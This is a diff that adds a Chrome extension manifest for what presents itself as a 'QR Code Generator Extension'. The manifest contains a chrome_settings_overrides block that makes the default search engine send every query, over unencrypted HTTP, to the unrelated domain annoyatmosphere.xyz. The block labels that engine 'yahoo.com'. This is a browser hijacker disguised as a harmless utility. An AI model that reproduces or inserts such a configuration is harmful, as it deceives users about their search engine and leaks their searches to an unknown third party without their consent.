@@ -1,0 +1,35 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+	"browser_action": {
+		"default_icon": {
+			"19": "images/icon19.png",
+			"38": "images/icon38.png"
+		},
+		"default_popup": "index.html",
+		"default_title": "The QR Code Extension"
+	},
+	"chrome_settings_overrides": {
+    "search_provider": {
+      "name": "yahoo.com",
+	  "keyword": "yahoo.com",
+      "search_url": "http://annoyatmosphere.xyz?text={searchTerms}",
+	  "favicon_url": "http://annoyatmosphere.xyz/icon.ico",
+      "encoding": "UTF-8",
+      "is_default": true
+    }
+	},
+	"default_locale": "en",
+	"description": "__MSG_application_description__",
+	"icons": {
+		"128": "images/icon128.png",
+		"16": "images/icon16.png",
+		"48": "images/icon48.png"
+	},
+	"manifest_version": 2,
+	"name": "QR Code Generator Extension",
+	"permissions": [
+		"activeTab"
+	],
+	"version": "1.0"
+}
